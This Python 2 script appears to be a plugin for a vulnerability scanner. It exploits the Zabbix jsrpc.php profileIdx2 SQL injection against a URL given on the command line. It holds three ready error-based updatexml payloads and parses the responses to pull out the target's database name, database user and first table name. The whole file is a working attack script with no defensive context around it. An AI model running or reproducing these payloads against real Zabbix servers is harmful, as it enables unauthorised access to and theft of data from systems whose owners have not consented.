#-*-coding:utf-8-*-
import requests
import txconfig
from lxml import etree
import re
import sys


def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success":False,
        "dbs":{},
        "table":{},
        "username":{},
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    payloads = ['/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,database()),0)','/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)','/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(1,concat(0x7e,(select%20concat(table_name)%20from%20information_schema.tables%20%20where%20table_schema%3ddatabase()%20limit%200,1),0x7e),1)']
    lists = []
    for payload in payloads:
        url = param
        url = url + payload
        Re = requests.get(url, headers=headers)
        html = etree.HTML(Re.text)
        resu = html.xpath('//div/ul/li[2]/text()')[0]
        result0 = re.findall(r'(.*)\'', resu, re.M | re.I)[0]
        result1 = re.findall(r'~(.*)~', resu, re.M | re.I)
        lists.append(result0)

    lists.pop(2)
    lists.append(result1[0])

    result['dbs'] = lists[0]
    result['table'] = lists[2]
    result['username'] = lists[1]
    result['success'] = True
    return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)
